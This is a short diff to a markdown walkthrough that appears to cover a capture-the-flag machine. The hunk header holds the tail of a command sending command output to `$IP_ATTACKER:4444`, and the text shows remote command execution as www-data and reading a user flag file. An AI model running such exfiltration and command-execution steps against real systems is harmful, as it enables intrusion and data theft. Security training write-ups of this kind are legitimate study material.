@@ -106,13 +106,7 @@ $IP_ATTACKER:4444 -d "`command goes here`"
 With this we can get the following:
 - `whoami` returns `www-data`.
 - It is possible to even get the user flag already!: ```cat /home/maria/Desktop/user``` (always check `/home` for getting users)
-
-Let's try now to get a more steady shell. See what files/folders are present:
-```
-ls -alh
-```
-
-In the listener:
+- ```ls -alh``` returns
 ```
 drwxr-xr-x 3 root     root     4.0K May 19  2017 .
 drwxr-xr-x 3 root     root     4.0K May 16  2017 ..
